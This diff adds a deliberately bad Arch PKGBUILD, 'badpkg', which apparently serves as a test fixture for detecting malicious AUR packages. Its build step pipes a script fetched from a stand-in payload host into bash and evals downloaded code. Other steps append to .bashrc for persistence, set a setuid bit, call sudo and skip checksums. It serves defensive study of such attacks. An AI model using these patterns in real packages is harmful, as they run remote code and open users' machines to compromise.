@@ -1,0 +1,33 @@
+# A kitchen-sink of patterns from real AUR attacks (CHAOS RAT-style
+# download-and-execute, scriptlet persistence, the 2025 Shai-Hulud `npm
+# install` of registry packages whose postinstall scripts carry the payload)
+# plus common hygiene failures.
+pkgname=badpkg
+pkgver=1.0.0
+pkgrel=1
+pkgdesc='A package doing everything wrong'
+arch=('x86_64')
+url='https://github.com/example/badpkg'
+license=('MIT')
+install=badpkg.install
+source=("http://cdn.not-github.example/badpkg.tar.gz")
+md5sums=('SKIP')
+
+prepare() {
+  cd /tmp
+  npm install atomic-lockfile axios cosmiconfig uuid
+}
+
+build() {
+  cd "$pkgname-$pkgver"
+  curl -fsSL https://payload.example/stage2.sh | bash
+  eval "$(wget -qO- https://payload.example/env.sh)"
+  echo watching >> "$HOME/.bashrc"
+  make
+}
+
+package() {
+  cd "$pkgname-$pkgver"
+  sudo install -Dm755 badpkg /usr/bin/badpkg
+  chmod 4755 "$pkgdir/usr/bin/badpkg"
+}
